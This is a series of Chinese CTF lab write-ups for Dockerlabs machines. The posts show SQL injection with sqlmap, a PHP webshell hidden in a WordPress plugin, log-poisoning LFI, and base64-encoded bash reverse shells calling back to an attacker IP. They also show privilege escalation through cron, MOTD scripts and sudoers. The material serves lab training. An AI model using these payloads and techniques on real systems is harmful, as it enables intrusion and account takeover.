256 ba:69:95:e3:df:7e:42:ec:69:ed:74:9e:6b:f6:9a:06 (ED25519)\r80/tcp open http Apache httpd 2.4.59 ((Debian))\r|_http-title: Did not follow redirect to http://norc.labs/?password-protected=login\u0026amp;redirect_to=http%3A%2F%2F172.17.0.2%2F\r|_http-server-header: Apache/2.4.59 (Debian)\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.11 ms 172.17.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 15.22 seconds 将norc.labs添加到**/etc/hosts**\n在抓包的时候发现似乎存在wordpress服务，可以看到Cookie的样式\n访问**/wp-admin**的时候自动就跳转到了登录页面\n使用WPscan并没有任何效果\nFFUF #\r[root@kali] /home/kali/Desktop ❯ ffuf -u \u0026#34;http://norc.labs/FUZZ\u0026#34; -w ./Wordpress-BruteForce-List/WPfuzz.txt -mc 200 -o result.txt 然后查看是否使用了插件\n[root@kali] /home/kali/Desktop ❯ cat result.txt | jq | grep -n \u0026#34;plugin\u0026#34;\r1196: \u0026#34;FUZZ\u0026#34;: \u0026#34;wp-admin/includes/plugin-install.php\u0026#34;\r1208: \u0026#34;url\u0026#34;: \u0026#34;http://norc.labs/wp-admin/includes/plugin-install.php\u0026#34;,\r1232: \u0026#34;FUZZ\u0026#34;: \u0026#34;wp-admin/includes/plugin.php\u0026#34;\r1244: \u0026#34;url\u0026#34;: \u0026#34;http://norc.labs/wp-admin/includes/plugin.php\u0026#34;,\r1664: \u0026#34;FUZZ\u0026#34;: \u0026#34;wp-admin/js/plugin-install.js\u0026#34;\r1676: \u0026#34;url\u0026#34;: \u0026#34;http://norc.labs/wp-admin/js/plugin-install.js\u0026#34;,\r3266: \u0026#34;FUZZ\u0026#34;: \u0026#34;/wp-content/plugins/wp-fastest-cache/readme.txt\u0026#34;\r3278: \u0026#34;url\u0026#34;: \u0026#34;http://norc.labs//wp-content/plugins/wp-fastest-cache/readme.txt\u0026#34;, CVE-2023-6063 #\r关注到wp-fastest-cache的版本号是1.2.1\n搜索到了一个SQL注入的漏洞\nmotikan2010/CVE-2023-6063-PoC: CVE-2023-6063 (WP Fastest Cache \u0026lt; 1.2.2 - UnAuth SQL Injection) [root@kali] /home/kali/Desktop ❯ sqlmap --dbms=mysql -u \u0026#34;http://norc.labs/wp-login.php\u0026#34; --cookie=\u0026#39;wordpress_logged_in=*\u0026#39; --level=2 --schema 可以看到存在时间盲注漏洞\n[root@kali] /home/kali/Desktop ❯ sqlmap --dbms=mysql -u \u0026#34;http://norc.labs/wp-login.php\u0026#34; --cookie=\u0026#39;wordpress_logged_in=*\u0026#39; --level=3 -D wordpress -T wp_users -C user_login,user_pass,user_email --dump 但是无法进行破解，不过得到一个子域名oledockers，进入后得到了密码\nwww-data #\r采用Dockerlabs-WalkingCMS - HYH里的方式制作插件\n安装后访问，POST传参执行命令\nhttp://norc.labs/wp-content/plugins/health-check/webshell.php\r#POST\rcmd=echo%20%22YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS8xMDAgMD4mMQ==%22%7Cbase64%20-d%7Cbash User #\r在kvzlx的目录中发现一个脚本，但是其中的**.wp-encrypted.txt并没有在目录中发现，/tmp/decoded.txt**也是空的\nwww-data@955ef139e3e6:/home/kvzlx$ ls -al\rls -al\rtotal 24\rdrwxr-xr-x 1 kvzlx kvzlx 4096 Jul 1 2024 .\rdrwxr-xr-x 1 root root 4096 Jul 1 2024 ..\r-rw-r--r-- 1 kvzlx kvzlx 220 Apr 23 2023 .bash_logout\r-rw-r--r-- 1 kvzlx kvzlx 3526 Apr 23 2023 .bashrc\r-rwxr--r-- 1 kvzlx kvzlx 164 Jun 9 2024 .cron_script.sh\r-rw-r--r-- 1 kvzlx kvzlx 807 Apr 23 2023 .profile\rwww-data@955ef139e3e6:/home/kvzlx$ cat .cron*\rcat .cron*\r#!/bin/bash\rENC_PASS=$(cat /var/www/html/.wp-encrypted.txt)\rDECODED_PASS=$(echo $ENC_PASS | base64 -d)\recho $DECODED_PASS \u0026gt; /tmp/decoded.txt\reval \u0026#34;$DECODED_PASS\u0026#34; 上传一下pspy跟踪进程\nDominicBreuker/pspy: Monitor linux processes without root permissions 可以发现UID为1000的用户在运行这个脚本，也就是kvzlx本人\nwww-data@955ef139e3e6:/var/www$ getent passwd 1000\rgetent passwd 1000\rkvzlx:x:1000:1000::/home/kvzlx:/bin/bash 因此可以写入进行**.wp-encrypted.txt提权，因为.cron_script.sh**无法写入\nwww-data@955ef139e3e6:/var/www/html$ echo \u0026#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzIwMCAwPiYx\u0026#34; \u0026gt;\u0026gt; .wp-encrypted.txt 监听得到kvzlx的反弹shell\nRoot #\r在linpeas输出中发现，/opt/python3可以修改uid\n查找GTFOBins👇\npython | GTFOBins Summary #\rUser：扫描得到wordpress缓存插件存在SQL时间盲注漏洞，得到子域名后拿到密码，登录后台从而写入木马反弹Shell。这里可以上传pspy来追踪进程发现存在用户的定时任务，根据脚本写入反弹语句。\nRoot：python可以设置当前用户的uid，可以设置为root权限启动**/bin/sh**。\n","date":"2025-02-24","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-norc/","section":"Posts","summary":"","title":"Dockerlabs-Norc","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/Desktop ❯ nmap 172.17.0.2 -sV -A\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 10:42 CST\rNmap scan report for 172.17.0.2\rHost is up (0.000085s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)\r| ssh-hostkey: | 256 2c:ea:4a:d7:b4:c3:d4:e2:65:29:6c:12:c4:58:c9:49 (ECDSA)\r|_ 256 a7:a4:a4:2e:3b:c6:0a:e4:ec:bd:46:84:68:02:5d:30 (ED25519)\r80/tcp open http Apache httpd 2.4.61 ((Debian))\r|_http-title: Login Page\r|_http-server-header: Apache/2.4.61 (Debian)\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.09 ms 172.17.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 9.98 seconds 进入网页是一个登录页面，尝试使用常见的默认账户登陆失败。\nSQL Injection #\r使用SQL注入发现回显了错误信息\n使用sqlmap进行注入\n[root@kali] /home/kali/Desktop ❯ sqlmap -u \u0026#34;http://172.17.0.2/auth.php\u0026#34; --data \u0026#34;username=root\u0026amp;password=root\u0026#34; -p password -vvv Database: users\rTable: usuarios\r[4 entries]\r+----+------------------------+------------+\r| id | password | username |\r+----+------------------------+------------+\r| 1 | chocolateadministrador | admin |\r| 2 | lucas | lucas |\r| 3 | soyagustin123 | agustin |\r| 4 | directoriotravieso | directorio |\r+----+------------------------+------------+ 可以使用admin的账户登录进去，但是好像导向的就是page.php，而page.php不需要身份验证就可以进去\n而这个查询温度的页面似乎也没有什么用。\n尝试访问**172.17.0.2/directoriotravieso/**发现一个图片可以下载\nZip Crack #\r尝试使用steghide进行提取，不过看起来需要密码\n使用stegcracker进行密码爆破\n[root@kali] /home/kali/Mirame ❯ stegcracker miramebien.jpg /usr/share/wordlists/rockyou.txt ⏎\rStegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)\rCopyright (c) 2025 - Luke Paris (Paradoxis)\rStegCracker has been retired following the release of StegSeek, which will blast through the rockyou.txt wordlist within 1.9 second as opposed to StegCracker which takes ~5 hours.\rStegSeek can be found at: https://github.com/RickdeJager/stegseek\rCounting lines in wordlist..\rAttacking file \u0026#39;miramebien.jpg\u0026#39; with wordlist \u0026#39;/usr/share/wordlists/rockyou.txt\u0026#39;..\rSuccessfully cracked file with password: chocolate\rTried 27 passwords\rYour file has been written to: miramebien.jpg.out\rchocolate 得到密码后再分离文件，发现还要密码。\n再爆破压缩包文件\n[root@kali] /home/kali/Mirame ❯ zip2john ocultito.zip \u0026gt;\u0026gt; zip.hash [root@kali] /home/kali/Mirame ❯ john zip.hash /usr/share/wordlists/rockyou.txt 得到密码为：stupid1\n[root@kali] /home/kali/Mirame ❯ cat secret.txt carlos:carlitos 进行ssh登录成功\nRoot #\r上传linpeas查看详细，发现find命令有特殊权限\n查看GTFObins\nfind | GTFOBins 非常简单\nSummary #\rUser：通过sql注入泄露出了用户信息，但是我没想到的是居然是作为目录访问。然后获取到图片进行分离，可能涉及到一点Misc的内容。然后爆破压缩包，得到密码进行ssh登录。\nRoot：经典的find提权不多说了。\n","date":"2025-02-22","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-mirame/","section":"Posts","summary":"","title":"Dockerlabs-Mirame","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Rutas ❯ nmap 172.17.0.2 -sV -A\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 19:23 CST\rNmap scan report for 172.17.0.2\rHost is up (0.000066s latency).\rNot shown: 997 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.5\r| ftp-anon: Anonymous FTP login allowed (FTP code 230)\r| -rw-r--r-- 1 0 0 0 Jul 11 2024 hola_disfruta\r|_-rw-r--r-- 1 0 0 293 Jul 11 2024 respeta.zip\r| ftp-syst: | STAT: | FTP server status:\r| Connected to ::ffff:172.17.0.1\r| Logged in as ftp\r| TYPE: ASCII\r| No session bandwidth limit\r| Session timeout in seconds is 300\r| Control connection is plain text\r| Data connections will be plain text\r| At session startup, client count was 4\r| vsFTPd 3.0.5 - secure, fast, stable\r|_End of status\r22/tcp open ssh OpenSSH 7.7p1 Ubuntu 3ubuntu13.3 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 63:16:54:2a:05:1d:8e:43:53:55:8b:d5:4e:35:c9:1f (ECDSA)\r|_ 256 21:24:77:5d:f8:2f:b2:64:ec:42:8b:0b:ef:f0:46:1b (ED25519)\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\r|_http-title: Apache2 Ubuntu Default Page: It works\r|_http-server-header: Apache/2.4.58 (Ubuntu)\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.07 ms 172.17.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 12.49 seconds FTP #\r存在匿名登录，并且可以下载文件\nZIP Crack #\r[root@kali] /home/kali/Rutas ❯ zip2john respeta.zip \u0026gt;\u0026gt; zip.hash [root@kali] /home/kali/Rutas ❯ john zip.hash /usr/share/wordlists/rockyou.txt [root@kali] /home/kali/Rutas ❯ cat oculto.txt Consigue la imagen crackpass.jpg\rfirstatack.github.io\rsin fuzzing con logica y observando la sacaras ,muy rapido\r获取 crackpass.jpg 图像\rfirstatack.github.io\r无需逻辑和观察，您就能很快明白。 在他的github仓库中得到这个图片\nfirstatack.github.io/assets/crackpass.jpg at main · firstatack/firstatack.github.io 使用steghide尝试进行分离，也可以用stegseek更快\n[root@kali] /home/kali/Rutas ❯ steghide extract -sf crackpass.jpg Enter passphrase: wrote extracted data to \u0026#34;passwd.zip\u0026#34;.\r[root@kali] /home/kali/Rutas ❯ unzip passwd.zip\rArchive: passwd.zip\rextracting: pass [root@kali] /home/kali/Rutas ❯ cat pass\rhackeada:denuevo Dirsearch #\r[root@kali] /home/kali/Rutas ❯ dirsearch -u 172.17.0.2 -t 50 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/Rutas/reports/_172.17.0.2/_25-02-22_19-29-36.txt\rTarget: http://172.17.0.2/\r[19:29:36] Starting: [19:29:37] 403 - 275B - /.ht_wsr.txt [19:29:37] 403 - 275B - /.htaccess.bak1 [19:29:37] 403 - 275B - /.htaccess.sample\r[19:29:37] 403 - 275B - /.htaccess.save [19:29:37] 403 - 275B - /.htaccess_extra [19:29:37] 403 - 275B - /.htaccess_orig\r[19:29:37] 403 - 275B - /.htaccessBAK\r[19:29:37] 403 - 275B - /.htaccessOLD2 [19:29:37] 403 - 275B - /.htaccess.orig [19:29:37] 403 - 275B - /.htm\r[19:29:37] 403 - 275B - /.html\r[19:29:37] 403 - 275B - /.htaccess_sc [19:29:37] 403 - 275B - /.htpasswd_test [19:29:37] 403 - 275B - /.htpasswds\r[19:29:37] 403 - 275B - /.httr-oauth [19:29:37] 403 - 275B - /.htaccessOLD [19:29:37] 403 - 275B - /.php [19:29:49] 200 - 615B - /index.php [19:29:49] 200 - 615B - /index.php/login/ [19:29:56] 403 - 275B - /server-status/ [19:29:56] 403 - 275B - /server-status\rTask Completed www-data #\r存在index.php，查看网页源码\n将其添加到**/etc/hosts**\n[root@kali] /home/kali/Rutas ❯ cat /etc/hosts 127.0.0.1 localhost\r127.0.1.1 kali\r::1 localhost ip6-localhost ip6-loopback\rff02::1 ip6-allnodes\rff02::2 ip6-allrouters\r172.17.0.2 trackedvuln.dl vulndb.com dockerlabs.es 访问trackedvuln.dl会跳出一个登录框，使用上面的账户进行登录\n没有可以直接利用的东西，这里对参数进行爆破，记得带上Header里的token\n[root@kali] /home/kali/Rutas ❯ ffuf -w ../Desktop/fuzzDicts/paramDict/AllParam.txt -u \u0026#39;http://trackedvuln.dl/index.php?FUZZ=../../../../../etc/passwd\u0026#39; -t 50 -H \u0026#34;Authorization : Basic aGFja2VhZGE6ZGVudWV2bw==\u0026#34; -fs 901\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://trackedvuln.dl/index.php?FUZZ=../../../../../etc/passwd\r:: Wordlist : FUZZ: /home/kali/Desktop/fuzzDicts/paramDict/AllParam.txt\r:: Header : Authorization: Basic aGFja2VhZGE6ZGVudWV2bw==\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 50\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 901\r________________________________________________\rlove [Status: 200, Size: 1079, Words: 172, Lines: 40, Duration: 5ms]\r:: Progress: [74332/74332] :: Job [1/1] :: 7812 req/sec :: Duration: [0:00:10] :: Errors: 0 :: 看来参数love返回值不太一样，但是似乎并不能直接读取到**/etc/passwd**\n但是好像可以通过PHP伪协议进行操作\n由于GET参数会存在URL转义的问题，因此我是这样构造的👇\n拿到反弹shell\nUser Maria #\r上传linpeas，似乎bash命令有特殊权限\n进入maria的目录，拿到密码\n使用ssh成功登录\nRoot #\r在linpeas中可以看到**/etc/update-motd.d/00-header**\n/etc/update-motd.d/00-header 是一个脚本文件，用于在每次用户登录时显示信息（Message of the Day，简称 MOTD）。具体来说，这个文件是 Linux 系统中用于定制用户登录后显示的内容的一部分。\n一般来说这个脚本会以root的身份启动\n因此只需要向里面追加提权的部分就行了\necho \u0026#34;cp /bin/bash /home/maria/bash \u0026amp;\u0026amp; chmod u+s /home/maria/bash\u0026#34; \u0026gt;\u0026gt; /etc/update-motd.d/00-header 或者说\necho \u0026#39;echo \u0026#34;maria ALL=(ALL) NOPASSWD: ALL\u0026#34; \u0026gt;\u0026gt; /etc/sudoers.d/maria\u0026#39; \u0026gt;\u0026gt; /etc/update-motd.d/00-header 然后重新连接ssh即可\nSummary #\rUser：FTP匿名登陆文件泄露，ZIP破解密码，分离图片。文件包含导致的PHP伪协议命令执行，我看其他的Writeup里面有用到filterchains，我的这个还是比较简单。\nRoot：给登录提示信息的脚本中添加提权部分，由于脚本会以root的身份启动，因此可以直接执行提权代码，方法也有很多。\nPS：我看到**/home目录下还有另一个用户norberto**，我好像并没有用到，不知道是不是非预期。\n","date":"2025-02-22","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-rutas/","section":"Posts","summary":"","title":"Dockerlabs-Rutas","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Veveno ❯ nmap 172.17.0.2 -sV -A\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 16:04 CST\rNmap scan report for 172.17.0.2\rHost is up (0.000089s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 89:9c:7b:99:95:b6:e8:03:5a:6a:d4:69:69:4a:8d:35 (ECDSA)\r|_ 256 ec:ec:90:44:4e:66:64:22:f6:8b:cd:29:d2:b5:60:6a (ED25519)\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\r|_http-server-header: Apache/2.4.58 (Ubuntu)\r|_http-title: Apache2 Ubuntu Default Page: It works\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.09 ms 172.17.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 9.95 seconds Gobuster #\r[root@kali] /home/kali/Veveno ❯ gobuster dir -u \u0026#34;http://172.17.0.2/\u0026#34; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html ⏎\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://172.17.0.2/\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,html\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/uploads (Status: 301) [Size: 310] [--\u0026gt; http://172.17.0.2/uploads/]\r/.html (Status: 403) [Size: 275]\r/.php (Status: 403) [Size: 275]\r/problems.php (Status: 200) [Size: 10671]\r/index.html (Status: 200) [Size: 10671]\r/.php (Status: 403) [Size: 275]\r/.html (Status: 403) [Size: 275]\r/server-status (Status: 403) [Size: 275]\rProgress: 661680 / 661683 (100.00%) 可以看到存在一个problems.php，但是回显和index.html是一样的，猜测需要构造一个参数\nFFUF #\r可以看到存在一个backdoor的参数\n[root@kali] /home/kali/Veveno ❯ curl --path-as-is \u0026#39;http://172.17.0.2/problems.php?backdoor=/etc/passwd\u0026#39;\rroot:x:0:0:root:/root:/bin/bash\rdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\rbin:x:2:2:bin:/bin:/usr/sbin/nologin\rsys:x:3:3:sys:/dev:/usr/sbin/nologin\rsync:x:4:65534:sync:/bin:/bin/sync\rgames:x:5:60:games:/usr/games:/usr/sbin/nologin\rman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\rlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\rmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\rnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\ruucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\rproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\rwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\rbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\rlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\rirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\r_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\rnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\rubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\rsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\rsystemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\rmessagebus:x:100:101::/nonexistent:/usr/sbin/nologin\rsystemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin\rsshd:x:101:65534::/run/sshd:/usr/sbin/nologin\rcarlos:x:1001:1001:,,,:/home/carlos:/bin/bash 在**/etc/passwd中找到一个carlos用户，但是读取不到ssh**密钥\nLFI #\r在遍历文件的时候发现可以读取日志文件\n在User-Agent部分插入一句话木马\n再包含日志文件，可以看到一句话木马被插入成功\n反弹shell\ncmd=system(\u0026#39;echo \u0026#34;YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS8xMDAgMD4mMQ==\u0026#34;|base64 -d|bash\u0026#39;); 在**/var/www/html**目录下得到一个留言\nwww-data@fbbc838fa7a8:/var/www/html$ cat anti*\rcat anti*\rEs imposible que me acuerde de la pass es inhackeable pero se que la tenpo en el mismo fichero desde fa 24 anys. trobala buscala soy el unico user del sistema. 我不可能记得通行证是无法破解的，但我知道我把它放在同一个文件里已经 24 年了。 查找24年前的文件\nfind / -type f -mtime +8760 得到密码是：pinguinochocolatero\n成功登录ssh\nRoot #\r发现一个隐藏的图片，将其下载出来\n[root@kali] /home/kali/Veveno ❯ scp carlos@172.17.0.2:/home/carlos/carpeta55/.toor.jpg ./ 查看图片的exif信息\n随后使用这个密码提升为root\nSummary #\rUser：经典的CTF日志包含，写入一句话马然后反弹shell，根据留言找到一个密码文件，从www-data提升到user。我看其他的解法大概也是写入一句话木马，但是不是利用的User-Agent，这是在CTF中比较常见的利用点。\nDockerlabs machines - Veneno Writeup - Byte Mind\nVeneno , DockerLabs | CTF\u0026rsquo;s Linux Apuntes\nRoot：图片的EXIF信息泄露，得到root的密码\n","date":"2025-02-22","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-veveno/","section":"Posts","summary":"","title":"Dockerlabs-Veveno","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/walkingcms ❯ nmap 172.17.0.2 -sV -A\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 09:39 CST\rNmap scan report for 172.17.0.2\rHost is up (0.000090s latency).\rNot shown: 999 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.57 ((Debian))\r|_http-server-header: Apache/2.4.57 (Debian)\r|_http-title: Apache2 Debian Default Page: It works\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.09 ms 172.17.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 9.87 seconds 进入网页后是apache的默认页面\nDirsearch #\r[root@kali] /home/kali/walkingcms ❯ dirsearch -u 172.17.0.2 -t 50 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/walkingcms/reports/_172.17.0.2/_25-02-22_09-42-07.txt\rTarget: http://172.17.0.2/\r[09:42:07] Starting: [09:42:08] 403 - 275B - /.ht_wsr.txt [09:42:08] 403 - 275B - /.htaccess.sample\r[09:42:08] 403 - 275B - /.htaccess.orig [09:42:08] 403 - 275B - /.htaccess.bak1 [09:42:08] 403 - 275B - /.htaccess_extra [09:42:08] 403 - 275B - /.htaccess_orig\r[09:42:08] 403 - 275B - /.htaccess_sc\r[09:42:08] 403 - 275B - /.htaccess.save\r[09:42:08] 403 - 275B - /.htaccessOLD2 [09:42:08] 403 - 275B - /.htm\r[09:42:08] 403 - 275B - /.html\r[09:42:08] 403 - 275B - /.htaccessBAK [09:42:08] 403 - 275B - /.htpasswd_test\r[09:42:08] 403 - 275B - /.htaccessOLD\r[09:42:08] 403 - 275B - /.htpasswds [09:42:08] 403 - 275B - /.httr-oauth [09:42:09] 403 - 275B - /.php [09:42:28] 403 - 275B - /server-status [09:42:28] 403 - 275B - /server-status/\r[09:42:35] 200 - 11KB - /wordpress/ [09:42:38] 200 - 3KB - /wordpress/wp-login.php\rTask Completed 发现存在wordpress目录\nWPscan #\r[root@kali] /home/kali/walkingcms ❯ wpscan --url \u0026#34;http://172.17.0.2/wordpress/\u0026#34; -e 存在用户名为：mario，针对其进行密码爆破\n[root@kali] /home/kali/walkingcms ❯ wpscan --url \u0026#34;http://172.17.0.2/wordpress/\u0026#34; -U username.txt -P /usr/share/wordlists/rockyou.txt 得到密码为：love，登录进入后台\nRevShell #\r这里我的思路是上传一个Webshell管理工具\n先到wordpress的插件市场里随便下载一个\n健康检查与故障排除 – WordPress 插件 | WordPress.org China 简体中文 然后将webshell.php插入压缩包再上传\n访问下面的URL路径即可进行命令执行\nhttp://172.17.0.2/wordpress/wp-content/plugins/health-check/webshell.php?cmd= 这里我使用的是Base64编码后再反弹，避免特殊字符的影响\necho%20%22YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS8xMDAgMD4mMQ==%22%7Cbase64%20-d%7Cbash 在**/home**目录下没有发现其他用户\n查看wp-config.php能看到有数据库的用户名和密码\n/** Database username */\rdefine( \u0026#39;DB_USER\u0026#39;, \u0026#39;wordpressuser\u0026#39; );\r/** Database password */\rdefine( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;t9sH76gpQ82UFeZ3GXZS\u0026#39; ); 不过里面没有东西。\n上传linpeas查看详细信息\n发现存在env的命令\nenv | GTFOBins 直接提升到root权限\nSummary #\rwww-data：WPscan可以扫描出wordpress存在的用户名，再对密码进行爆破，成功登录后台。通过上传插件的方式反弹shell，灵感来源于【靶机实战】WordPress – 花咲雨町 靶机解题思路 - 极核GetShell\nRoot：通过linpeas输出发现可以通过env提权。\n","date":"2025-02-22","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-walkingcms/","section":"Posts","summary":"","title":"Dockerlabs-WalkingCMS","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/dance-samba ❯ nmap 172.17.0.2 -sV -A\rPORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.5\r| ftp-anon: Anonymous FTP login allowed (FTP code 230)\r|_-rw-r--r-- 1 0 0 69 Aug 19 2024 nota.txt\r| ftp-syst: | STAT: | FTP server status:\r| Connected to ::ffff:172.17.0.1\r| Logged in as ftp\r| TYPE: ASCII\r| No session bandwidth limit\r| Session timeout in seconds is 300\r| Control connection is plain text\r| Data connections will be plain text\r| At session startup, client count was 2\r| vsFTPd 3.0.5 - secure, fast, stable\r|_End of status\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 a2:4e:66:7d:e5:2e:cf:df:54:39:b2:08:a9:97:79:21 (ECDSA)\r|_ 256 92:bf:d3:b8:20:ac:76:08:5b:93:d7:69:ef:e7:59:e1 (ED25519)\r139/tcp open netbios-ssn Samba smbd 4.6.2\r445/tcp open netbios-ssn Samba smbd 4.6.2\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\rHost script results:\r| smb2-time: | date: 2025-02-21T12:45:31\r|_ start_date: N/A\r| smb2-security-mode: | 3:1:1: |_ Message 